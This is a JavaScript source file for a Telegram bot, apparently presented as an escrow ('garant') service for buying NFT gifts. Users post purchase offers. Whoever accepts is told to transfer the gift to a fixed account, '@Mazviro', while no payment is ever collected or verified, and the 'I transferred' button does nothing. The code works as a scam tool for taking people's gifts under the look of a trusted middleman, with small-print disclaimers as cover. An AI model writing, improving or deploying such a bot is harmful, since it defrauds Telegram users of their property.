
import { InlineKeyboard } from "grammy";
import { randomBytes } from "node:crypto";

const RECEIVER = "@Mazviro";
const BOT_USERNAME = "DealixGarant_Bot";
const DAY = 24 * 60 * 60 * 1000;

const offers = new Map();

function id() {
  return randomBytes(8).toString("hex");
}

function parseOffer(text) {
  const match = text.trim().match(
    /^(?:offer\s+)?((?:https?:\/\/)?(?:www\.)?(?:t\.me|telegram\.me)\/nft\/([A-Za-z0-9_-]+)-(\d+)\/?)\s+(\d+)$/i
  );

  if (!match) return null;

  const price = Number(match[4]);

  if (
    !Number.isSafeInteger(price) ||
    price <= 0 ||
    price > 100000000
  ) return null;

  const slug = match[2];
  const number = match[3];

  const name = slug
    .replace(/([a-z])([A-Z])/g, "$1 $2")
    .replace(/([A-Z]+)([A-Z][a-z])/g, "$1 $2");

  return {
    gift: `${name} #${number}`,
    url: `https://t.me/nft/${slug}-${number}`,
    price
  };
}

function createOffer(data, creatorId) {
  const key = id();

  const offer = {
    ...data,
    creatorId,
    acceptedBy: null,
    status: "active",
    expiresAt: Date.now() + DAY
  };

  offers.set(key, offer);
  return key;
}

function isExpired(offer) {
  if (Date.now() >= offer.expiresAt) {
    offer.status = "expired";
    return true;
  }
  return false;
}

function offerText(offer, buyerName) {
  return (
    `🎁 Предложение о покупке NFT\n\n` +
    `${buyerName} предлагает ${offer.price} ⭐ ` +
    `за ${offer.gift}.\n\n` +
    `⏳ Действует 24 часа.\n\n` +
    `${offer.url}\n\n` +
    `Предложение пользователя. ` +
    `Оплата не подтверждена.`
  );
}

function offerButtons(key) {
  return new InlineKeyboard()
    .text("✅ Принять", `accept:${key}`)
    .text("❌ Отклонить", `reject:${key}`);
}

function sentButtons(key) {
  return new InlineKeyboard()
    .text("✅ Я передал подарок", `sent:${key}`);
}

function acceptedText(offer) {
  return (
    `🎁 Предложение принято\n\n` +
    `Подарок: ${offer.gift}\n` +
    `Предложенная цена: ${offer.price} ⭐\n\n` +
    `Указанный получатель: ${RECEIVER}\n\n` +
    `Для передачи откройте подарок в Telegram, ` +
    `выберите «Передать» и проверьте ` +
    `имя получателя перед подтверждением.\n\n` +
    `⚠️ Бот не подтверждает получение оплаты. ` +
    `Не передавайте подарок, пока не ` +
    `убедитесь в безопасности сделки.`
  );
}

function preview(url) {
  return {
    is_disabled: false,
    url,
    prefer_large_media: true
  };
}

export function registerCommands(bot) {

  bot.command("start", async (ctx) => {
    await ctx.reply(
      `🎁 NFT Offers\n\n` +
      `Создавайте предложения о покупке ` +
      `Telegram NFT-подарков.\n\n` +
      `Команда:\n` +
      `/offer t.me/nft/JoyfulBundle-30358 484\n\n` +
      `Для отправки предложения в другой чат:\n` +
      `@${BOT_USERNAME} offer ` +
      `t.me/nft/JoyfulBundle-30358 484`
    );
  });

  bot.command("offer", async (ctx) => {
    if (ctx.chat.type !== "private") {
      return ctx.reply(
        "Создавайте предложения в личном чате с ботом."
      );
    }

    const text = ctx.message.text.replace(
      /^\/offer(?:@\w+)?\s*/i,
      ""
    );

    const data = parseOffer(text);

    if (!data) {
      return ctx.reply(
        `❌ Неверный формат.\n\n` +
        `/offer t.me/nft/JoyfulBundle-30358 484`
      );
    }

    const key = createOffer(data, ctx.from.id);
    const offer = offers.get(key);

    await ctx.reply(
      offerText(
        offer,
        ctx.from.first_name || "Покупатель"
      ),
      {
        reply_markup: offerButtons(key),
        link_preview_options: preview(offer.url)
      }
    );
  });

  // INLINE MODE
  bot.inlineQuery(/.*/, async (ctx) => {
    const query = ctx.inlineQuery.query.trim();
    const data = parseOffer(query);

    if (!data) {
      return ctx.answerInlineQuery([], {
        cache_time: 0,
        is_personal: true
      });
    }

    const key = createOffer(data, ctx.from.id);
    const offer = offers.get(key);

    const result = {
      type: "article",
      id: key,
      title: `🎁 ${offer.gift} — ${offer.price} ⭐`,
      description: "Отправить предложение о покупке NFT",
      input_message_content: {
        message_text: offerText(
          offer,
          ctx.from.first_name || "Покупатель"
        ),
        link_preview_options: preview(offer.url)
      },
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "✅ Принять",
              callback_data: `accept:${key}`
            },
            {
              text: "❌ Отклонить",
              callback_data: `reject:${key}`
            }
          ]
        ]
      }
    };

    await ctx.answerInlineQuery([result], {
      cache_time: 0,
      is_personal: true
    });
  });

  // ACCEPT
  bot.callbackQuery(/^accept:([a-f0-9]+)$/, async (ctx) => {
    const key = ctx.match[1];
    const offer = offers.get(key);

    if (!offer) {
      return ctx.answerCallbackQuery({
        text: "Предложение не найдено.",
        show_alert: true
      });
    }

    if (isExpired(offer)) {
      return ctx.answerCallbackQuery({
        text: "Срок действия предложения истёк.",
        show_alert: true
      });
    }

    if (offer.status !== "active") {
      return ctx.answerCallbackQuery({
        text: "Предложение уже обработано.",
        show_alert: true
      });
    }

    if (ctx.from.id === offer.creatorId) {
      return ctx.answerCallbackQuery({
        text: "Нельзя принять собственное предложение.",
        show_alert: true
      });
    }

    offer.status = "accepted";
    offer.acceptedBy = ctx.from.id;

    await ctx.answerCallbackQuery({
      text: "✅ Предложение принято. Оплата не подтверждена.",
      show_alert: true
    });

    // Для Inline Mode бот может не иметь права
    // отправлять сообщения в чужой чат.
    // Поэтому инструкции открываются по ссылке.
    const keyboard = new InlineKeyboard()
      .url(
        "📋 Открыть инструкции",
        `https://t.me/${BOT_USERNAME}?start=deal_${key}`
      );

    if (ctx.inlineMessageId) {
      try {
        await ctx.editMessageReplyMarkup({
          reply_markup: keyboard
        });
      } catch (error) {
        console.error("Inline edit:", error);
      }
    } else {
      await ctx.reply(
        acceptedText(offer),
        { reply_markup: sentButtons(key) }
      );
    }
  });

  // REJECT
  bot.callbackQuery(/^reject:([a-f0-9]+)$/, async (ctx) => {
    const offer = offers.get(ctx.match[1]);

    if (!offer || isExpired(offer)) {
      return ctx.answerCallbackQuery({
        text: "Предложение недоступно.",
        show_alert: true
      });
    }

    if (offer.status !== "active") {
      return ctx.answerCallbackQuery({
        text: "Предложение уже обработано.",
        show_alert: true
      });
    }

    if (ctx.from.id === offer.creatorId) {
      return ctx.answerCallbackQuery({
        text: "Нельзя отклонить собственное предложение.",
        show_alert: true
      });
    }

    offer.status = "rejected";

    await ctx.answerCallbackQuery({
      text: "❌ Предложение отклонено.",
      show_alert: true
    });
  });

  // DEEP LINK: instructions for accepted offer
  bot.command("start", async (ctx) => {
    const payload = ctx.match?.trim() || "";

    if (!payload.startsWith("deal_")) return;

    const key = payload.slice(5);
    const offer = offers.get(key);

    if (
      !offer ||
      offer.status !== "accepted" ||
      offer.acceptedBy !== ctx.from.id
    ) {
      return ctx.reply(
        "❌ Сделка недоступна."
      );
    }

    await ctx.reply(
      acceptedText(offer),
      { reply_markup: sentButtons(key) }
    );
  });

  // USER PRESSED "I TRANSFERRED"
  bot.callbackQuery(/^sent:([a-f0-9]+)$/, async (ctx) => {
    const offer = offers.get(ctx.match[1]);

    if (
      !offer ||
      offer.status !== "accepted" ||
      offer.acceptedBy !== ctx.from.id
    ) {
      return ctx.answerCallbackQuery({
        text: "Предложение недоступно.",
        show_alert: true
      });
    }

    await ctx.answerCallbackQuery({
      text: "❌ Передача подарка не подтверждена.",
      show_alert: true
    });
  });
}

